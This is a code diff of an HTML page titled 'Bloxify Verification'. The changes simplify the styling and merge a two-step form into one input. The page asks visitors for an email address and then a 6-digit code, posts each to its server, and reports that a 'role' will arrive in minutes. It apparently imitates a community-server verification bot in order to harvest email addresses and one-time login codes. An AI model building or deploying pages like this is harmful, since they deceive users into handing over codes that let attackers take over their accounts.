@@ -9,155 +9,118 @@ html, body {
     margin: 0;
     width: 100%;
     height: 100%;
-    overflow: hidden;
     background: #000;
-    font-family: system-ui, sans-serif;
+    font-family: Arial, sans-serif;
+    overflow: hidden;
 }
 
-/* CANVAS SPACE */
-canvas {
+/* STATIC STAR BACKGROUND */
+body::before {
+    content: "";
     position: fixed;
     inset: 0;
+    background-image:
+        radial-gradient(#fff 1px, transparent 1px);
+    background-size: 120px 120px;
+    opacity: 0.25;
 }
 
-/* UI CARD */
-#card {
+/* CARD */
+#box {
     position: absolute;
     top: 50%;
     left: 50%;
     transform: translate(-50%, -50%);
-    width: 520px;
-    padding: 40px;
-    background: linear-gradient(160deg, #1c1c1c, #0b0b0b);
-    border-radius: 20px;
-    box-shadow: 0 30px 80px rgba(0,0,0,.8), inset 0 0 30px rgba(255,255,255,.05);
+    width: 420px;
+    padding: 35px;
+    background: #111;
+    border-radius: 14px;
+    box-shadow: 0 0 40px rgba(0,0,0,.8);
     text-align: center;
-    animation: float 6s ease-in-out infinite;
-}
-
-@keyframes float {
-    50% { transform: translate(-50%, -55%); }
 }
 
 h1 {
-    color: #f2f2f2;
-    margin-bottom: 10px;
+    color: #eee;
+    margin-bottom: 8px;
 }
 
 p {
-    color: #aaa;
+    color: #999;
     font-size: 14px;
 }
 
 input {
     width: 100%;
     padding: 14px;
-    margin-top: 14px;
-    background: #121212;
-    border: 1px solid #2a2a2a;
-    border-radius: 10px;
-    color: white;
+    margin-top: 18px;
     font-size: 16px;
+    border-radius: 8px;
+    border: none;
+    background: #1c1c1c;
+    color: white;
 }
 
 button {
     width: 100%;
     padding: 14px;
-    margin-top: 18px;
-    background: linear-gradient(145deg, #2d2d2d, #141414);
-    border: none;
-    border-radius: 10px;
-    color: white;
+    margin-top: 14px;
     font-size: 16px;
+    border-radius: 8px;
+    border: none;
+    background: #2a2a2a;
+    color: white;
     cursor: pointer;
 }
 
 button:hover {
-    background: #333;
+    background: #3a3a3a;
 }
 </style>
 </head>
 
 <body>
-<canvas id="space"></canvas>
 
-<div id="card">
+<div id="box">
     <h1>Bloxify Verification</h1>
-    <p>Verify your account to gain access.</p>
+    <p id="desc">Enter your email to begin verification.</p>
 
-    <input id="email" placeholder="Email address">
-    <button onclick="step1()">Continue</button>
-
-    <div id="step2" style="display:none">
-        <input id="code" placeholder="6-digit code">
-        <button onclick="submit()">Verify</button>
-    </div>
-
-    <p id="done" style="display:none">
-        ✅ Verification complete<br>
-        Please wait 5–10 minutes to receive your role.
-    </p>
+    <input id="input" placeholder="Email address">
+    <button onclick="submit()">Submit</button>
 </div>
 
 <script>
-/* ===== SPACE CANVAS ===== */
-const c = document.getElementById("space");
-const ctx = c.getContext("2d");
-let w, h, stars;
-
-function resize() {
-    w = c.width = window.innerWidth;
-    h = c.height = window.innerHeight;
-    stars = Array.from({length: 120}, () => ({
-        x: Math.random()*w,
-        y: Math.random()*h,
-        z: Math.random()*1.5 + 0.5
-    }));
-}
-window.onresize = resize;
-resize();
-
-c.onclick = e => {
-    stars.forEach(s => {
-        const dx = s.x - e.clientX;
-        const dy = s.y - e.clientY;
-        s.x += dx * 0.2;
-        s.y += dy * 0.2;
-    });
-};
-
-function draw() {
-    ctx.clearRect(0,0,w,h);
-    stars.forEach(s => {
-        s.y += s.z;
-        if (s.y > h) s.y = 0;
-        ctx.fillStyle = "white";
-        ctx.beginPath();
-        ctx.arc(s.x, s.y, s.z*2, 0, Math.PI*2);
-        ctx.fill();
-    });
-    requestAnimationFrame(draw);
-}
-draw();
-
-/* ===== UI LOGIC ===== */
-function step1() {
-    document.getElementById("step2").style.display = "block";
-}
+let step = "email";
 
 function submit() {
-    fetch("/submit", {
-        method: "POST",
-        headers: {"Content-Type":"application/json"},
-        body: JSON.stringify({
-            email: email.value,
-            code: code.value
-        })
-    });
+    const value = input.value.trim();
+    if (!value) return;
 
-    document.getElementById("step2").style.display = "none";
-    document.getElementById("done").style.display = "block";
+    if (step === "email") {
+        fetch("/email", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ email: value })
+        });
+
+        input.value = "";
+        input.placeholder = "6-digit code";
+        desc.innerText = "Enter the verification code.";
+        step = "code";
+
+    } else {
+        fetch("/code", {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ code: value })
+        });
+
+        box.innerHTML = `
+            <h1>Verification Complete</h1>
+            <p>Please wait 5–10 minutes to receive your role.</p>
+        `;
+    }
 }
 </script>
+
 </body>
 </html>
